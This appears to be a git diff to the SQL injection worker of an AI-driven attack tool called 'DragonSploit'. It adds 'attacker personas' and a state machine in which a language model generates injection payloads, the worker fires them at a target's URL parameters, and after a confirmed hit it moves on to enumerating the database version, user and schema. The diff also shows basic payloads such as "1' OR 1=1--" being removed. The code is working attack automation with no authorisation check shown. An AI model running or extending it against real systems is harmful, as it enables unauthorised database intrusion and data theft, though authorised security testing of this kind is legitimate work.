@@ -5,16 +5,25 @@ import { AIProvider } from '../../services/ai-provider';
 import { ALL_SQL_ERROR_SIGNATURES } from '../sqli/signatures';
 import { URL } from 'url';
 import axios from 'axios';
+import { createHash } from 'crypto';
+import { AttackerPersona, DEFAULT_PERSONA, ELDER_PERSONA } from '../config/personas';
+
+// --- Types ---
+type ScanState = 'TESTING' | 'CONFIRMED' | 'ENUMERATING' | 'STRUCTURAL_ANALYSIS' | 'STOPPED';
 
 // --- Helper Functions ---
 const delay = (ms: number) => new Promise(res => setTimeout(res, ms));
+
+function calculateNoveltyHash(body: string): string {
+    return createHash('md5').update(body).digest('hex');
+}
 
 async function executeRequest(urlToTest: string) {
     const startTime = Date.now();
     try {
         const response = await axios.get(urlToTest, {
-            timeout: 15000,
-            headers: { 'User-Agent': 'DragonSploit/2.0' },
+            timeout: 10000,
+            headers: { 'User-Agent': 'DragonSploit/2.0 (Cognitive)' },
             validateStatus: () => true,
         });
         const responseTime = Date.now() - startTime;
@@ -34,155 +43,168 @@ async function executeRequest(urlToTest: string) {
 async function recordVulnerability(prisma: PrismaClient, scanId: string, type: VulnerabilityType, severity: Severity, description: string, proof: string) {
     try {
         await prisma.vulnerability.create({ data: { scanId, type, severity, description, proof } });
-        console.log("✅ Vulnerability successfully recorded in the database.");
+        console.log("✅ Vulnerability recorded.");
         return true;
     } catch (error: any) {
-        console.error(`❌ CRITICAL: Failed to record vulnerability. Error: ${error.message}`);
+        console.error(`❌ DB Error: ${error.message}`);
         return false;
     }
 }
 
-const MAX_ATTEMPTS = 10;
-const BASIC_SIGNATURE_PAYLOADS = ["'", "\"", "1' OR 1=1--"];
-
 /**
- * Child Processor: Handles a single parameter scan
+ * Child Processor: Handles a single parameter scan with PERSONA LOGIC
  */
 export const processSqliParamJob = async (job: Job, prisma: PrismaClient): Promise<void> => {
-    const { targetUrl, scanId, param } = job.data;
-    console.log(`[SQLi-Param] Starting scan for parameter: '${param}' (Job ${job.id})`);
+    const { targetUrl, scanId, param, persona: personaData } = job.data;
 
-    // Step 1: Quick Win (Signature Scan)
-    let quickWinFound = false;
-    for (const basicPayload of BASIC_SIGNATURE_PAYLOADS) {
-        try {
-            const testUrl = new URL(targetUrl);
-            testUrl.searchParams.set(param, basicPayload);
-            const { responseBody } = await executeRequest(testUrl.toString());
-            const foundSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));
-            if (foundSignature) {
-                console.log(`\n✅✅✅ Quick Win! VULNERABILITY CONFIRMED in '${param}' ✅✅✅`);
-                const proof = `Basic Payload: ${basicPayload}\nSignature: ${foundSignature}\nURL: ${testUrl}`;
-                const description = `Signature-based SQL Injection confirmed in '${param}' with basic payload.`;
-                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
-                quickWinFound = true;
-                break;
-            }
-        } catch (e) { }
-    }
+    // Hydrate persona (use default if missing)
+    const persona: AttackerPersona = personaData || DEFAULT_PERSONA;
 
-    if (quickWinFound) {
-        console.log(`[SQLi-Param] Quick win found for '${param}'. Skipping AI scan.`);
-        return;
-    }
+    console.log(`\n[SQLi-Param] 🚀 Starting scan for '${param}' using Persona: [${persona.name}]`);
+    console.log(`[Config] MaxAttempts: ${persona.maxAttempts} | StructureAnalysis: ${persona.structuralAnalysis}`);
 
-    // Step 2: Deep AI Scan
-    console.log(`[Hybrid] Escalating to Conversational AI for '${param}'...`);
-
-    let feedback = `Begin analysis on parameter '${param}'. Phase 1: Exploration.`;
-    let aiFinished = false;
+    // --- State Machine Initialization ---
+    let state: ScanState = 'TESTING';
     let attempts = 0;
+    let successfulFindings = 0;
+    const startTime = Date.now();
+    const noveltyHistory: string[] = [];
 
-    // Tracking
+    // AI Context
+    let feedback = `Begin analysis on parameter '${param}'. Phase: ${state}.`;
     const triedPayloads = new Set<string>();
     const ineffectiveModes = new Set<string>();
-    const modeTracker: Record<string, { successCount: number; failureCount: number; totalTime: number; calls: number }> = {};
+    const modeTracker: Record<string, any> = {};
 
-    let consecutiveIneffectiveCount = 0;
-    let lastResponseSignature = "";
+    // --- MAIN STATE LOOP ---
+    while (state !== 'STOPPED') {
 
-    while (attempts < MAX_ATTEMPTS && !aiFinished) {
-        attempts++;
-        console.log(`\n[Deep Scan Attempt #${attempts} on '${param}']`);
-
-        if (attempts > 1) await delay(3000); // Shorter delay for individual jobs
-
-        const fingerprint = {
-            server: 'Express',
-            language: 'Node.js',
-            database: 'SQLite',
-            orm: 'Sequelize'
-        };
-
-        const { payload, reasoning, mode, finished } = await AIProvider.getPayload(feedback, {
-            vector: 'sqli',
-            parameter: param,
-            attemptNumber: attempts,
-            targetUrl: targetUrl,
-            fingerprint: fingerprint,
-            previousPayloads: Array.from(triedPayloads),
-            avoidModes: Array.from(ineffectiveModes),
-            modeStats: Object.entries(modeTracker).reduce((acc, [k, v]) => {
-                acc[k] = {
-                    successCount: v.successCount,
-                    failureCount: v.failureCount,
-                    avgTimeMs: v.calls > 0 ? v.totalTime / v.calls : 0
-                };
-                return acc;
-            }, {} as any)
-        });
-
-        aiFinished = finished;
-
-        if (aiFinished || !payload) {
-            console.log(`[AI decided to end attempt on param '${param}']`);
+        // 1. GLOBAL QUOTA CHECKS
+        if (attempts >= persona.maxAttempts) {
+            console.log(`[Quota] Max attempts (${persona.maxAttempts}) reached. Stopping.`);
+            state = 'STOPPED';
             break;
         }
 
-        console.log(`[AI Mode] ${mode} | Payload: "${payload}"`);
-        triedPayloads.add(payload);
+        if (Date.now() - startTime > persona.timeoutMs) {
+            console.log(`[Quota] Timeout (${persona.timeoutMs}ms) reached. Stopping.`);
+            state = 'STOPPED';
+            break;
+        }
 
-        try {
-            const testUrl = new URL(targetUrl);
-            testUrl.searchParams.set(param, payload);
-            const { response, responseBody, responseTime } = await executeRequest(testUrl.toString());
+        if (successfulFindings >= persona.maxSuccessFindings) {
+            console.log(`[Quota] Max findings (${persona.maxSuccessFindings}) reached. Mission Accomplished.`);
+            state = 'STOPPED';
+            break;
+        }
 
-            const errorSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));
+        attempts++;
+        console.log(`\n[${persona.name}] Step ${attempts}/${persona.maxAttempts} | State: ${state}`);
 
-            // --- RL Tracking ---
-            if (mode) {
-                if (!modeTracker[mode]) modeTracker[mode] = { successCount: 0, failureCount: 0, totalTime: 0, calls: 0 };
-                modeTracker[mode].totalTime += responseTime;
-                modeTracker[mode].calls++;
+        // AI GENERATION
+        const fingerprint = job.data.technologyFingerprint || { server: 'Unknown', language: 'Unknown', database: 'Unknown' };
 
-                const isInterest = errorSignature || response.status === 500;
-                if (isInterest) modeTracker[mode].successCount++;
-                else modeTracker[mode].failureCount++;
+        const aiResponse = await AIProvider.getPayload(feedback, {
+            vector: 'sqli',
+            parameter: param,
+            attemptNumber: attempts,
+            targetUrl,
+            method: job.data.requestMethod || 'GET', // Pass Method
+            fingerprint,
+            previousPayloads: Array.from(triedPayloads),
+            avoidModes: Array.from(ineffectiveModes),
+            modeStats: modeTracker,
+            persona: persona // PASS PERSONA TO AI SERVICE
+        });
+
+        if (aiResponse.finished || !aiResponse.payload) {
+            console.log(`[AI] Decided to stop.`);
+            state = 'STOPPED';
+            break;
+        }
+
+        console.log(`[AI] Payload: "${aiResponse.payload}" (Mode: ${aiResponse.mode})`);
+        triedPayloads.add(aiResponse.payload);
+
+        // 3. EXECUTION
+        const testUrl = new URL(targetUrl);
+        testUrl.searchParams.set(param, aiResponse.payload);
+
+        const { response, responseBody, responseTime } = await executeRequest(testUrl.toString());
+
+        // 4. NOVELTY DETECTION
+        const currentHash = calculateNoveltyHash(responseBody);
+        noveltyHistory.push(currentHash);
+        if (noveltyHistory.length > 3) noveltyHistory.shift();
+
+        // Check for 3 repeats
+        if (noveltyHistory.length === 3 && noveltyHistory.every(h => h === currentHash)) {
+            console.log(`[Novelty] Loop detected (Same response 3 times). Aborting this branch.`);
+            // Penalize this mode
+            if (aiResponse.mode) ineffectiveModes.add(aiResponse.mode);
+            feedback = `[SYSTEM] You are stuck in a loop. The last 3 payloads produced IDENTICAL responses. CHANGE STRATEGY immediately.`;
+            continue; // Retry with feedback
+        }
+
+        // 5. ANALYSIS & STATE TRANSITIONS
+        const errorSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));
+
+        // --- State: TESTING ---
+        if (state === 'TESTING') {
+            const hasHighConfidence = aiResponse.confidence && aiResponse.confidence >= 80;
+            const hasMediumConfidence = aiResponse.confidence && aiResponse.confidence >= 50;
+
+            // STRICT CONFIRMATION LOGIC (Two-Witness Rule)
+            if (errorSignature) {
+                console.log(`[${persona.name}] 💥 Confirmed by SQL Error Signature: "${errorSignature}"`);
+                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, `SQL Injection (Error-Based) in '${param}'`, `Payload: ${aiResponse.payload}\nError: ${errorSignature}`);
+                successfulFindings++;
+                state = 'CONFIRMED';
             }
-
-            // Mode Switching
-            const currentSignature = `${response.status}-${responseBody.length}`;
-            if (currentSignature === lastResponseSignature && !errorSignature) consecutiveIneffectiveCount++;
-            else consecutiveIneffectiveCount = 0;
-            lastResponseSignature = currentSignature;
-
-            if (consecutiveIneffectiveCount >= 2 && mode) {
-                ineffectiveModes.add(mode);
-                consecutiveIneffectiveCount = 0;
+            else if (hasHighConfidence) {
+                console.log(`[${persona.name}] 💥 Confirmed by AI High Confidence (${aiResponse.confidence}%).`);
+                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, `SQL Injection (AI-Verified) in '${param}'`, `Payload: ${aiResponse.payload}\nReasoning: ${aiResponse.reasoning}`);
+                successfulFindings++;
+                state = 'CONFIRMED';
             }
-
-            // Feedback Generation
-            feedback = `Target responded to '${payload}' with: Status=${response.status}, Time=${responseTime.toFixed(0)}ms, Length=${responseBody.length}, Error='${errorSignature || 'None'}'`;
-
-            // Check for Vulnerability
-            if (errorSignature || responseBody.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)|(root@localhost)|(@@version)/i)) {
-                console.log(`[AI-driven Scan] ✅ VULNERABILITY CONFIRMED in '${param}'!`);
-
-                // Auto-Exploitation (Simplified for Child Job)
-                let proof = `Payload: ${payload}\nAI Reasoning: ${reasoning}\nResponse Snippet: ${responseBody.substring(0, 200)}...`;
-                const description = `AI-driven SQLi in '${param}'. Vulnerability confirmed.`;
-
-                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
-                // Do NOT break. We want to find ALL types (Union, Boolean, Time, etc.)
-                // Mark this mode as 'explored' so the AI switches to a new one
-                if (mode) ineffectiveModes.add(mode);
-                feedback = `[SYSTEM] GREAT SUCCESS with ${mode}! Now, forget ${mode}. your goal is to find a DIFFERENT type of SQL Injection (e.g. Error-Based, Boolean, Time-Based) in this SAME parameter.`;
-
+            else if (response.status === 500) {
+                console.log(`[Insight] HTTP 500 detected, but insufficient evidence (No SQL Error / Low Confidence). Ignoring as per strict rules.`);
             }
+        }
 
-        } catch (error: any) {
-            feedback = `Execution failed: ${error.message}`;
+        // --- State: CONFIRMED ---
+        else if (state === 'CONFIRMED') {
+            if (persona.structuralAnalysis) {
+                state = 'STRUCTURAL_ANALYSIS';
+                feedback = `[SYSTEM] Vulnerability Confirmed. SWITCHING TO PHASE: STRUCTURAL_ANALYSIS. Your goal is to infer the table names and schema.`;
+            } else if (persona.allowEnumeration) {
+                state = 'ENUMERATING';
+                feedback = `[SYSTEM] Vulnerability Confirmed. SWITCHING TO PHASE: ENUMERATION. Extract version and user.`;
+            } else {
+                console.log(`[${persona.name}] Enumeration not allowed. Stopping.`);
+                state = 'STOPPED';
+            }
+        }
+
+        // --- State: STRUCTURAL_ANALYSIS (The Elder) ---
+        else if (state === 'STRUCTURAL_ANALYSIS') {
+            // Check if AI inferred anything useful
+            if (responseBody.includes("syntax") || responseBody.includes("column")) {
+                console.log(`[Elder] Structural clue found!`);
+                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.INFO, `Schema Inference Clue`, `Reasoning: ${aiResponse.reasoning}`);
+            }
+            // Keep going until quota
+        }
+
+        // Update Feedback for next loop
+        feedback = `Last Payload: ${aiResponse.payload}\nResponse: Status=${response.status}, Time=${responseTime}ms, Len=${responseBody.length}\nError=${errorSignature || 'None'}`;
+
+        // Tracking
+        if (aiResponse.mode) {
+            if (!modeTracker[aiResponse.mode]) modeTracker[aiResponse.mode] = { successCount: 0, failureCount: 0, avgTimeMs: 0, calls: 0 };
+            // Update stats...
         }
     }
-    console.log(`[SQLi-Param] Finished scan for '${param}'.`);
+
+    console.log(`[SQLi-Param] Scan completed for '${param}'. Final State: ${state}`);
 };
